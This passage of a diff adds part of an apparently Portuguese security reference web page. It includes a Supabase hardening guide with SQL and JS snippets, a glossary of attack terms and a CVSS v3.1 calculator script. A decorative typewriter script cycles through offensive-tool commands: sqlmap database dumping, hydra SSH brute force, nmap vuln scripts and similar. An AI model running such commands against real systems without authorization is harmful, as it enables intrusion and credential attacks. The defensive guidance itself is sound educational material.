+        <select id="ai" onchange="calcCVSS()">
+          <option value="N">None (N) — 0</option>
+          <option value="L">Low (L) — 0.22</option>
+          <option value="H">High (H) — 0.56</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="cvss-result">
+      <div class="cvss-score" id="cvssScore">0.0</div>
+      <div class="cvss-rating" id="cvssRating">None</div>
+      <div class="cvss-vector" id="cvssVector">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N</div>
+    </div>
+  </div>
+
+  <!-- ── Segurança Supabase ── -->
+  <div class="tab-panel" id="panel-supabase">
+    <div class="section-title">🔷 Segurança Supabase — Guia Completo</div>
+    <div class="section-desc">Melhores práticas e riscos específicos do Supabase para projetos em produção.</div>
+    <div class="tip-list">
+
+      <div class="tip danger searchable">
+        <div class="tip-title">🚨 CRÍTICO: Nunca use a Service Role Key no frontend</div>
+        <div class="tip-body">A service role key bypassa todas as RLS policies. Se exposta em código JS do browser, qualquer usuário tem acesso administrativo completo ao banco. Use somente em backend seguro ou Edge Functions com autenticação adequada.</div>
+        <pre>// ❌ ERRADO — service role key no frontend
+const supabase = createClient(url, process.env.SUPABASE_SERVICE_KEY)
+
+// ✅ CORRETO — anon key no frontend, service key apenas no server
+const supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY)</pre>
+      </div>
+
+      <div class="tip danger searchable">
+        <div class="tip-title">🔒 Row Level Security (RLS) — Habilite SEMPRE</div>
+        <div class="tip-body">Sem RLS, qualquer usuário com a anon key pode ler/escrever em qualquer tabela. RLS deve ser habilitado em todas as tabelas que contêm dados de usuários.</div>
+        <pre>-- Habilite RLS
+ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;
+
+-- Policy: usuário só acessa próprios dados
+CREATE POLICY "users_own_data" ON profiles
+  FOR ALL USING (auth.uid() = user_id);
+
+-- Verifique quais tabelas NÃO têm RLS
+SELECT tablename FROM pg_tables
+WHERE schemaname = 'public'
+AND tablename NOT IN (SELECT tablename FROM pg_policies);</pre>
+      </div>
+
+      <div class="tip warn searchable">
+        <div class="tip-title">⚠️ Anon Key — Controle o que é acessível publicamente</div>
+        <div class="tip-body">A anon key é pública por design, mas o que ela pode acessar é controlado por RLS. Configure policies restritivas. Use a Dashboard → API para ver exatamente o que a anon role pode fazer.</div>
+        <pre>-- Permita apenas leitura de dados públicos
+CREATE POLICY "public_read" ON posts
+  FOR SELECT USING (is_published = true);
+
+-- Nenhuma operação de escrita para anon
+-- (não criar policy de INSERT/UPDATE/DELETE para anon)</pre>
+      </div>
+
+      <div class="tip warn searchable">
+        <div class="tip-title">⚠️ Auth — Configure rate limiting e email confirmação</div>
+        <div class="tip-body">Por padrão, Supabase Auth pode ser abusado para spam de emails e brute force. Configure adequadamente no Dashboard → Auth → Settings.</div>
+        <pre>-- Supabase Auth config recomendada (via Dashboard):
+-- Email confirmation: ENABLED
+-- Double confirm email change: ENABLED
+-- Secure email change: ENABLED
+-- Session expiry: 3600 (1 hora) para dados sensíveis
+-- Enable captcha (hCaptcha ou Turnstile)</pre>
+      </div>
+
+      <div class="tip good searchable">
+        <div class="tip-title">✅ Rate Limiting via Edge Functions</div>
+        <div class="tip-body">Implemente rate limiting customizado em Edge Functions para endpoints críticos usando upstash/ratelimit.</div>
+        <pre>// Edge Function com rate limit (Upstash Redis)
+import { Ratelimit } from "@upstash/ratelimit";
+import { Redis } from "@upstash/redis";
+
+const ratelimit = new Ratelimit({
+  redis: Redis.fromEnv(),
+  limiter: Ratelimit.slidingWindow(10, "10 s"),
+});
+
+const { success } = await ratelimit.limit(req.headers.get("x-real-ip")!);
+if (!success) return new Response("Too Many Requests", { status: 429 });</pre>
+      </div>
+
+      <div class="tip good searchable">
+        <div class="tip-title">✅ Storage — Controle acesso a buckets</div>
+        <div class="tip-body">Buckets públicos expõem todos os arquivos. Use buckets privados com signed URLs para conteúdo sensível. Implemente RLS no storage também.</div>
+        <pre>-- Bucket privado com policy de acesso
+INSERT INTO storage.buckets (id, name, public)
+VALUES ('documents', 'documents', false);  -- NÃO público
+
+-- Policy: apenas dono pode acessar
+CREATE POLICY "owner_access" ON storage.objects
+  FOR ALL USING (auth.uid() = owner);
+
+-- Gerar URL assinada válida por 60s (server-side)
+const { data } = await supabase.storage
+  .from('documents')
+  .createSignedUrl('file.pdf', 60);</pre>
+      </div>
+
+      <div class="tip good searchable">
+        <div class="tip-title">✅ API Rate Limits — Configure no projeto</div>
+        <div class="tip-body">Supabase tem rate limits por plano. Configure limites adicionais no seu projeto: Database → API Limits no Dashboard.</div>
+        <pre>-- Monitore uso de conexões
+SELECT count(*), state FROM pg_stat_activity
+WHERE datname = current_database()
+GROUP BY state;
+
+-- Configure connection pooling (PgBouncer)
+-- Dashboard → Database → Connection Pooling
+-- Mode: Transaction (recomendado para serverless)</pre>
+      </div>
+
+      <div class="tip searchable">
+        <div class="tip-title">🔍 Auditoria de Segurança — Checklist</div>
+        <div class="tip-body">Execute regularmente esta checklist para manter seu projeto Supabase seguro.</div>
+        <pre>□ RLS habilitado em todas as tabelas com dados de usuário
+□ Service role key NUNCA no frontend ou repositório git
+□ Email confirmation habilitado
+□ Captcha habilitado para signup/login
+□ Buckets de storage adequadamente privados
+□ Edge Functions com auth validation
+□ Segredos em variáveis de ambiente (não hard-coded)
+□ Logs de Auth revisados regularmente
+□ npm audit / dependências atualizadas
+□ CORS configurado com origins específicos</pre>
+      </div>
+
+    </div>
+  </div>
+
+</div><!-- /content -->
+
+<script>
+// ── Typewriter effect ──────────────────────────────────────────────
+const phrases = [
+  '$ nmap -sV --script vuln target.com',
+  '$ sqlmap -u "https://site.com/api?id=1" --dbs',
+  '$ hydra -L users.txt -P pass.txt ssh://target',
+  '$ nikto -h https://site.com',
+  '$ gobuster dir -u https://site.com -w wordlist.txt',
+  '$ nuclei -target https://site.com -t cves/',
+];
+let phraseIdx = 0, charIdx = 0, deleting = false;
+const tw = document.getElementById('typewriter');
+function typeWrite() {
+  const phrase = phrases[phraseIdx];
+  if (!deleting) {
+    charIdx++;
+    tw.innerHTML = phrase.slice(0, charIdx) + '<span class="cursor"></span>';
+    if (charIdx === phrase.length) { deleting = true; setTimeout(typeWrite, 2000); return; }
+  } else {
+    charIdx--;
+    tw.innerHTML = phrase.slice(0, charIdx) + '<span class="cursor"></span>';
+    if (charIdx === 0) { deleting = false; phraseIdx = (phraseIdx + 1) % phrases.length; }
+  }
+  setTimeout(typeWrite, deleting ? 30 : 60);
+}
+typeWrite();
+
+// ── Tab switching ──────────────────────────────────────────────────
+function switchTab(tabId, el) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById('panel-' + tabId).classList.add('active');
+  filterSearch(); // re-apply search on tab switch
+}
+
+// ── Search ─────────────────────────────────────────────────────────
+document.getElementById('searchInput').addEventListener('input', filterSearch);
+function filterSearch() {
+  const q = document.getElementById('searchInput').value.toLowerCase().trim();
+  document.querySelectorAll('.searchable').forEach(el => {
+    if (!q) { el.classList.remove('hidden'); return; }
+    const text = el.textContent.toLowerCase();
+    el.classList.toggle('hidden', !text.includes(q));
+  });
+}
+
+// ── Glossary ───────────────────────────────────────────────────────
+const GLOSSARY = [
+  { term: 'ARP Spoofing', def: 'Falsificação de tabelas ARP para interceptar tráfego de rede (Man-in-the-Middle).' },
+  { term: 'Attack Surface', def: 'Conjunto de todos os pontos de entrada possíveis para um ataque em um sistema.' },
+  { term: 'BOLA / IDOR', def: 'Broken Object Level Authorization: acesso a objetos de outros usuários via ID manipulation.' },
+  { term: 'Buffer Overflow', def: 'Escrita além dos limites de um buffer de memória, podendo sobrescrever código e causar RCE.' },
+  { term: 'CSRF', def: 'Cross-Site Request Forgery: força browser autenticado a executar ações não intencionadas.' },
+  { term: 'CVE', def: 'Common Vulnerabilities and Exposures: identificador único para vulnerabilidades públicas (CVE-2021-44228).' },
+  { term: 'CVSS', def: 'Common Vulnerability Scoring System: score 0-10 de severidade de vulnerabilidades.' },
+  { term: 'CWE', def: 'Common Weakness Enumeration: catálogo de tipos de fraquezas de software (CWE-79 = XSS).' },
+  { term: 'DDoS', def: 'Distributed Denial of Service: ataque de negação de serviço usando múltiplas origens.' },
+  { term: 'DNS Rebinding', def: 'Ataque que modifica resolução DNS para contornar Same-Origin Policy e acessar recursos internos.' },
+  { term: 'Exploit', def: 'Código ou técnica que tira vantagem de uma vulnerabilidade para obter efeito desejado.' },
+  { term: 'Exfiltration', def: 'Transferência não autorizada de dados de um sistema comprometido.' },
+  { term: 'HSTS', def: 'HTTP Strict Transport Security: header que força HTTPS e previne downgrade attacks.' },
+  { term: 'IDOR', def: 'Insecure Direct Object Reference: acesso a recursos usando referências previsíveis sem autorização.' },
+  { term: 'JWT', def: 'JSON Web Token: token de autenticação stateless composto por header.payload.signature.' },
+  { term: 'LDAP', def: 'Lightweight Directory Access Protocol: protocolo para acesso a serviços de diretório (Active Directory).' },
+  { term: 'Man-in-the-Middle', def: 'Interceptação de comunicação entre duas partes sem conhecimento delas.' },
+  { term: 'Mass Assignment', def: 'Atribuição automática de parâmetros HTTP a atributos de modelo, incluindo campos privilegiados.' },
+  { term: 'OAuth2', def: 'Protocolo de autorização para acesso delegado a recursos de terceiros.' },
+  { term: 'OSINT', def: 'Open Source Intelligence: coleta de informações de fontes públicas (Shodan, LinkedIn, GitHub).' },
+  { term: 'Payload', def: 'Dados enviados ao sistema alvo como parte de um exploit ou ataque.' },
+  { term: 'Pentesting', def: 'Teste de penetração: avaliação de segurança autorizada simulando ataques reais.' },
+  { term: 'Pivot', def: 'Usar um sistema comprometido como ponto de salto para atacar outros sistemas na mesma rede.' },
+  { term: 'RCE', def: 'Remote Code Execution: execução arbitrária de código no sistema alvo.' },
+  { term: 'ReDoS', def: 'Regular Expression Denial of Service: regex mal escrita causa tempo de processamento exponencial.' },
+  { term: 'RLS', def: 'Row Level Security: mecanismo PostgreSQL/Supabase para controle de acesso por linha de tabela.' },
+  { term: 'SAML', def: 'Security Assertion Markup Language: padrão XML para SSO (Single Sign-On) federado.' },
+  { term: 'Session Fixation', def: 'Ataque que força usuário a usar sessão pré-definida pelo atacante.' },
+  { term: 'Shodan', def: 'Motor de busca para dispositivos conectados à internet. Encontra servidores expostos, IoT, etc.' },
+  { term: 'Slowloris', def: 'Ataque DoS L7 que mantém muitas conexões HTTP abertas parcialmente, esgotando o servidor.' },
+  { term: 'SSRF', def: 'Server-Side Request Forgery: força servidor a fazer requisições para URLs controladas pelo atacante.' },
+  { term: 'Supply Chain Attack', def: 'Comprometimento de software através da cadeia de dependências (ex: SolarWinds, npm packages).' },
+  { term: 'TLS', def: 'Transport Layer Security: protocolo criptográfico que protege comunicações na internet (HTTPS).' },
+  { term: 'WAF', def: 'Web Application Firewall: filtra, monitora e bloqueia tráfego HTTP malicioso.' },
+  { term: 'XSS', def: 'Cross-Site Scripting: injeção de scripts maliciosos em páginas web servidas a outros usuários.' },
+  { term: 'XXE', def: 'XML External Entity: injection em parsers XML para ler arquivos ou fazer SSRF.' },
+  { term: 'Zero-Day', def: 'Vulnerabilidade desconhecida ao vendor, sem patch disponível. Muito valorizada em mercados de exploits.' },
+];
+
+const grid = document.getElementById('glossaryGrid');
+GLOSSARY.sort((a, b) => a.term.localeCompare(b.term)).forEach(({ term, def }) => {
+  grid.innerHTML += `<div class="glossary-item searchable"><div class="glossary-term">${term}</div><div class="glossary-def">${def}</div></div>`;
+});
+
+// ── CVSS v3.1 Calculator ───────────────────────────────────────────
+const AV_W  = { N: 0.85, A: 0.62, L: 0.55, P: 0.20 };
+const AC_W  = { L: 0.77, H: 0.44 };
+const UI_W  = { N: 0.85, R: 0.62 };
+const CIA_W = { N: 0.00, L: 0.22, H: 0.56 };
+
+function getPR(pr, scope) {
+  if (scope === 'C') return { N: 0.85, L: 0.68, H: 0.50 }[pr];
+  return { N: 0.85, L: 0.62, H: 0.27 }[pr];
+}
+
+function calcCVSS() {
+  const av = document.getElementById('av').value;
+  const ac = document.getElementById('ac').value;
+  const pr = document.getElementById('pr').value;
+  const ui = document.getElementById('ui').value;
+  const s  = document.getElementById('s').value;
+  const c  = document.getElementById('ci').value;
+  const i  = document.getElementById('ii').value;
+  const a  = document.getElementById('ai').value;
+
+  const ISS = 1 - (1 - CIA_W[c]) * (1 - CIA_W[i]) * (1 - CIA_W[a]);
+  const IS = s === 'U' ? 6.42 * ISS : 7.52 * (ISS - 0.029) - 3.25 * Math.pow(ISS - 0.02, 15);
+  const ES = AV_W[av] * AC_W[ac] * getPR(pr, s) * UI_W[ui];
+
+  let base = 0;
+  if (IS <= 0) {
+    base = 0;
+  } else if (s === 'U') {
+    base = Math.min(IS + ES, 10);
+  } else {
+    base = Math.min(1.08 * (IS + ES), 10);
+  }
+
+  // Round up to 1 decimal
+  const score = Math.ceil(base * 10) / 10;
+
+  let rating = 'None', color = '#64748b';
+  if (score === 0)         { rating = 'None';     color = '#64748b'; }
+  else if (score < 4)      { rating = 'Low';      color = '#00ff9f'; }
+  else if (score < 7)      { rating = 'Medium';   color = '#ffff00'; }
+  else if (score < 9)      { rating = 'High';     color = '#ff8c00'; }
+  else                     { rating = 'Critical'; color = '#ff0040'; }
+
+  const vector = `CVSS:3.1/AV:${av}/AC:${ac}/PR:${pr}/UI:${ui}/S:${s}/C:${c}/I:${i}/A:${a}`;
+
+  document.getElementById('cvssScore').textContent = score.toFixed(1);
+  document.getElementById('cvssScore').style.color = color;
+  document.getElementById('cvssRating').textContent = rating;
+  document.getElementById('cvssRating').style.color = color;
+  document.getElementById('cvssVector').textContent = vector;
+}
+
+// Initialize CVSS
+calcCVSS();
+</script>
+</body>
+</html>
